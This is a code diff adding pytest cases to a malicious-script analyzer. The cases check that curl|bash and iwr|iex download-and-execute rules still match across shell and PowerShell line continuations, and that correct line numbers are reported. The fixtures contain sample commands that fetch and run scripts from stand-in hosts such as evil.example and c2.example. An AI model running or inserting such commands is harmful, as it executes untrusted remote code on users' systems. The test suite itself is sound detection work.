@@ -130,6 +130,86 @@ def test_rule_negative(content):
     assert result.matches == [], f"benign content unexpectedly matched: {_rule_ids(result)}"
 
 
+def test_shell_backslash_continuation_joins_download_exec_pipe():
+    """H5a：shell 反斜杠续行不得拆开 curl|bash 的共享正则命中。"""
+    content = "#!/bin/bash\ncurl -fsSL https://evil.example/x.sh \\\n| bash\n"
+    result = analyze(content.encode(), filename="x.sh")
+    assert "threat-download-exec-pipe" in _rule_ids(result)
+    hit = next(m for m in result.matches if m.rule_id == "threat-download-exec-pipe")
+    assert hit.line == 2  # first physical line of the continued command
+
+
+def test_shell_pseudo_pipe_continuation_joins_download_exec_pipe():
+    """DEV06-E：无反斜杠、下一行以 | 开头的伪管道续行须接合后再匹配。"""
+    content = "#!/bin/bash\ncurl -fsSL https://evil.example/x.sh\n| bash\n"
+    result = analyze(content.encode(), filename="x.sh")
+    assert "threat-download-exec-pipe" in _rule_ids(result)
+    hit = next(m for m in result.matches if m.rule_id == "threat-download-exec-pipe")
+    assert hit.line == 2
+
+
+def test_unicode_line_separator_splits_then_pseudo_pipe_joins():
+    """DEV06-G / M-D2：U+2028 须按 splitlines 切开，再与伪管道接合。"""
+    content = "#!/bin/bash\ncurl -fsSL https://evil.example/x.sh\u2028| bash\n"
+    result = analyze(content.encode(), filename="x.sh")
+    assert "threat-download-exec-pipe" in _rule_ids(result)
+    hit = next(m for m in result.matches if m.rule_id == "threat-download-exec-pipe")
+    assert hit.line == 2
+
+
+def test_word_boundary_rejects_curl_prefix():
+    """DEV06-G：\\bcurl\\b 不得命中 notcurl 前缀。"""
+    content = "#!/bin/bash\nnotcurl -fsSL https://evil.example/x.sh | bash\n"
+    result = analyze(content.encode(), filename="x.sh")
+    assert "threat-download-exec-pipe" not in _rule_ids(result)
+
+
+def test_powershell_pseudo_pipe_continuation_joins_download_exec():
+    """DEV06-E：PowerShell 无反引号伪管道续行同样接合。"""
+    content = "Write-Host hi\niwr http://c2.example/update.ps1\n| iex\n"
+    result = analyze(content.encode(), filename="update.ps1")
+    assert result.detected_type == "powershell"
+    assert "threat-download-exec-powershell" in _rule_ids(result)
+    hit = next(m for m in result.matches if m.rule_id == "threat-download-exec-powershell")
+    assert hit.line == 2
+
+
+def test_python_does_not_join_pseudo_pipe():
+    """非 shell/powershell 不得做伪管道接合。"""
+    content = 'print("curl http://x")\n| not_shell\n'
+    result = analyze(content.encode(), filename="x.py")
+    assert result.detected_type == "python"
+    assert "threat-download-exec-pipe" not in _rule_ids(result)
+
+
+def test_powershell_backtick_continuation_joins_download_exec():
+    """DEV06-D：PowerShell 反引号续行不得拆开 iwr|iex。"""
+    content = "Write-Host hi\niwr http://c2.example/update.ps1 `\n| iex\n"
+    result = analyze(content.encode(), filename="update.ps1")
+    assert result.detected_type == "powershell"
+    assert "threat-download-exec-powershell" in _rule_ids(result)
+    hit = next(m for m in result.matches if m.rule_id == "threat-download-exec-powershell")
+    assert hit.line == 2
+
+
+def test_shell_does_not_join_powershell_backtick():
+    """shell 类型不得把行尾反引号当续行符。"""
+    content = "#!/bin/bash\necho ready `\ncurl -fsSL https://evil.example/x.sh | bash\n"
+    result = analyze(content.encode(), filename="x.sh")
+    assert result.detected_type == "shell"
+    hit = next(m for m in result.matches if m.rule_id == "threat-download-exec-pipe")
+    assert hit.line == 3
+
+
+def test_python_trailing_backslash_not_joined_as_shell():
+    """非 shell 类型不得做 POSIX 续行接合，避免污染 Python 行号。"""
+    content = 'path = "foo\\\\"\nos.system("ls")\n'
+    result = analyze(content.encode(), filename="x.py")
+    assert result.detected_type == "python"
+    hit = next(m for m in result.matches if m.rule_id == "threat-py-os-system-regex")
+    assert hit.line == 2
+
+
 class TestPythonAstChecks:
     def test_os_system(self):
         result = analyze(b"import os\nos.system('ls')\n", filename="a.py")
